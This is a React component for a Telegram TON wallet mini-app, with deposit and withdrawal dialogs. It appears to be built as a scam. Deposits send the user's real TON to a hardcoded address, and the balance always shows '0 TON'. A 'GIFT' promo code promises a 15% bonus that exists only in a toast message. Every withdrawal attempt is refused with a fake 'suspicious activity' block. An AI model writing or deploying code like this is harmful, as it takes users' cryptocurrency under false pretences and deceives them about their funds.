import { Plus, Minus, Wallet } from "lucide-react";
import { Button } from "@/components/ui/button";
import tonLogo from "@assets/toncoin_1760893904370.png";
import { useTelegramUser } from "@/hooks/use-telegram-user";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import { useTonConnectUI, useTonAddress, useTonWallet } from '@tonconnect/ui-react';

export default function TopHeader() {
  const { username, avatarLetter } = useTelegramUser();
  const { language, t } = useLanguage();
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const userFriendlyAddress = useTonAddress();
  const wallet = useTonWallet();
  const [isDepositOpen, setIsDepositOpen] = useState(false);
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [depositAmount, setDepositAmount] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [promoCode, setPromoCode] = useState("");
  const [depositAddress] = useState("UQAb0o8lRX_dZvl2NL6pInxbSjixvdrCf_G4KdqYRCgIjDz1");

  const handleDeposit = async () => {
    if (!wallet) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Подключите кошелёк TON" : "Connect TON wallet first",
        variant: "destructive",
      });
      tonConnectUI.openModal();
      return;
    }

    const amount = parseFloat(depositAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма депозита: 0.05 TON" : "Minimum deposit: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    let finalAmount = amount;
    let bonusApplied = false;
    if (promoCode.trim().toUpperCase() === "GIFT") {
      finalAmount = amount * 1.15;
      bonusApplied = true;
    }

    const amountInNanotons = Math.floor(amount * 1_000_000_000).toString();

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: [
        {
          address: depositAddress,
          amount: amountInNanotons,
        }
      ]
    };

    try {
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log('Transaction sent:', result);
      
      if (bonusApplied) {
        toast({
          title: t.toast.success,
          description: `${amount} TON + 15% ${language === 'ru' ? 'бонус' : 'bonus'} = ${finalAmount.toFixed(2)} TON`,
        });
      } else {
        toast({
          title: t.toast.success,
          description: `${language === 'ru' ? 'Депозит успешно отправлен' : 'Deposit sent successfully'}: ${amount} TON`,
        });
      }
      
      setIsDepositOpen(false);
      setDepositAmount("");
      setPromoCode("");
    } catch (error) {
      console.error('Transaction failed:', error);
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Транзакция отменена или не удалась" : "Transaction cancelled or failed",
        variant: "destructive",
      });
    }
  };

  const handleWithdraw = () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма вывода: 0.05 TON" : "Minimum withdrawal: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    toast({
      title: t.profile.suspiciousActivity,
      description: t.profile.withdrawalBlocked,
      variant: "destructive",
    });
    setIsWithdrawOpen(false);
    setWithdrawAmount("");
  };

  return (
    <>
      <header className="sticky top-0 z-50 flex items-center justify-between px-3 sm:px-4 py-3 sm:py-4 bg-background/95 backdrop-blur-sm">
        <div className="flex items-center gap-2 sm:gap-3" data-testid="text-title">
          <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
            <span className="text-sm sm:text-base font-bold text-white">{avatarLetter}</span>
          </div>
          <span className="text-base sm:text-lg font-semibold text-foreground">{username}</span>
        </div>

        <div className="flex items-center gap-2 sm:gap-3">
          {!wallet ? (
            <Button
              size="sm"
              onClick={() => tonConnectUI.openModal()}
              className="px-3 py-1.5 h-8 sm:h-9 rounded-full bg-blue-600 hover:bg-blue-700 text-xs sm:text-sm gap-1.5"
              data-testid="button-connect-wallet"
            >
              <Wallet className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              <span className="hidden sm:inline">{language === 'ru' ? 'Подключить' : 'Connect'}</span>
            </Button>
          ) : (
            <>
              <div className="flex items-center gap-1.5 sm:gap-2 px-2.5 sm:px-4 py-1.5 sm:py-2 rounded-full bg-primary/10 border border-primary/20" data-testid="display-balance">
                <img src={tonLogo} alt="TON" className="w-5 h-5 sm:w-6 sm:h-6 rounded-full object-cover" />
                <span className="text-xs sm:text-sm font-semibold text-foreground">0 TON</span>
              </div>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-green-600 hover:bg-green-700 active-elevate-2 shadow-md"
                data-testid="button-deposit"
                onClick={() => setIsDepositOpen(true)}
              >
                <Plus className="w-4 h-4 text-white" />
              </Button>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-red-600 hover:bg-red-700 active-elevate-2 shadow-md"
                data-testid="button-withdraw"
                onClick={() => setIsWithdrawOpen(true)}
              >
                <Minus className="w-4 h-4 text-white" />
              </Button>
            </>
          )}
        </div>
      </header>

      <Dialog open={isDepositOpen} onOpenChange={setIsDepositOpen}>
        <DialogContent className="bg-card border-card-border rounded-3xl">
          <DialogHeader>
            <DialogTitle className="text-foreground text-xl">{t.profile.depositTitle}</DialogTitle>
          </DialogHeader>
          <div className="space-y-5 pt-2">
            {wallet && (
              <div className="bg-muted/50 rounded-xl p-3 text-xs">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-muted-foreground">{language === 'ru' ? 'Ваш кошелёк:' : 'Your wallet:'}</span>
                  <span className="font-mono text-foreground">{userFriendlyAddress?.slice(0, 8)}...{userFriendlyAddress?.slice(-6)}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">{language === 'ru' ? 'Адрес депозита:' : 'Deposit address:'}</span>
                  <span className="font-mono text-foreground">{depositAddress.slice(0, 8)}...{depositAddress.slice(-6)}</span>
                </div>
              </div>
            )}

            <div>
              <Label htmlFor="deposit-amount" className="text-sm text-muted-foreground mb-3 block">
                {t.profile.amount}
              </Label>
              <div className="flex items-center gap-3 bg-gradient-to-r from-blue-500/10 to-cyan-500/10 rounded-2xl p-4 border-2 border-blue-500/20">
                <img src={tonLogo} alt="TON" className="w-8 h-8 rounded-full flex-shrink-0" />
                <Input
                  id="deposit-amount"
                  type="number"
                  step="0.01"
                  min="0.05"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="0.05"
                  className="flex-1 border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 text-lg font-semibold"
                />
              </div>
              <p className="text-xs text-muted-foreground mt-2 ml-1">{language === 'ru' ? 'Минимум: 0.05 TON' : 'Minimum: 0.05 TON'}</p>
            </div>

            <div>
              <Label htmlFor="promo-code" className="text-sm text-muted-foreground mb-3 block">
                {t.profile.promoCode}
              </Label>
              <Input
                id="promo-code"
                type="text"
                value={promoCode}
                onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                placeholder={language === 'ru' ? 'Введите промокод' : 'Enter promo code'}
                className="uppercase bg-muted/50 border-border rounded-xl h-12 text-base"
              />
              {promoCode.toUpperCase() === "GIFT" && (
                <p className="text-xs text-green-600 mt-2 ml-1 font-medium">
                  ✓ {language === 'ru' ? 'Бонус +15% будет начислен!' : 'Bonus +15% will be applied!'}
                </p>
              )}
            </div>

            <div className="flex gap-3 pt-2">
              <Button
                variant="outline"
                onClick={() => {
                  setIsDepositOpen(false);
                  setDepositAmount("");
                  setPromoCode("");
                }}
                className="flex-1 h-12 rounded-xl"
              >
                {t.profile.cancel}
              </Button>
              <Button
                onClick={handleDeposit}
                className="flex-1 h-12 rounded-xl bg-gradient-to-r from-green-600 to-green-500 hover:from-green-700 hover:to-green-600 shadow-lg shadow-green-500/25"
              >
                {wallet ? t.profile.confirm : (language === 'ru' ? 'Подключить кошелёк' : 'Connect Wallet')}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
        <DialogContent className="bg-card border-card-border rounded-3xl">
          <DialogHeader>
            <DialogTitle className="text-foreground text-xl">{t.profile.withdrawTitle}</DialogTitle>
          </DialogHeader>
          <div className="space-y-5 pt-2">
            <div>
              <Label htmlFor="withdraw-amount" className="text-sm text-muted-foreground mb-3 block">
                {t.profile.amount}
              </Label>
              <div className="flex items-center gap-3 bg-gradient-to-r from-red-500/10 to-orange-500/10 rounded-2xl p-4 border-2 border-red-500/20">
                <img src={tonLogo} alt="TON" className="w-8 h-8 rounded-full flex-shrink-0" />
                <Input
                  id="withdraw-amount"
                  type="number"
                  step="0.01"
                  min="0.05"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  placeholder="0.05"
                  className="flex-1 border-0 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 text-lg font-semibold"
                />
              </div>
              <p className="text-xs text-muted-foreground mt-2 ml-1">{language === 'ru' ? 'Минимум: 0.05 TON' : 'Minimum: 0.05 TON'}</p>
            </div>

            <div className="flex gap-3 pt-2">
              <Button
                variant="outline"
                onClick={() => {
                  setIsWithdrawOpen(false);
                  setWithdrawAmount("");
                }}
                className="flex-1 h-12 rounded-xl"
              >
                {t.profile.cancel}
              </Button>
              <Button
                onClick={handleWithdraw}
                className="flex-1 h-12 rounded-xl bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 shadow-lg shadow-red-500/25"
              >
                {t.profile.confirm}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}